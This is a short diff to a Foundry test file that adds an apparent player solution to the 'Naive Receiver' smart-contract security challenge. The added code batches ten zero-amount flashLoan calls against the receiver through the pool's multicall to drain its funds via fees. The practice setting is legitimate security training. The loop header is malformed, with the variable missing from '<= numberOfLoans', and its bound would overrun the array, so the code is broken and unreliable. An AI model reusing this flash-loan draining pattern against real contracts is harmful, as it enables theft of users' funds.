@@ -77,6 +77,25 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        uint8 numberOfLoans = 10;
+
+        // Create array of encoded flashLoan calls
+        bytes[] memory encodedCalls = new bytes[](numberOfLoans);
+
+        for(uint8 i = 0;  <= numberOfLoans; i++) {
+            // Encode the call to flashLoan
+            encodedCalls[i] = abi.encodeWithSignature(
+                "flashLoan(address,uint256,bytes)",
+                address(receiver),
+                0,
+                ""
+            );
+        }
+
+        // Execute the multicall transaction
+        pool.multicall(encodedCalls);
+
         
     }
 
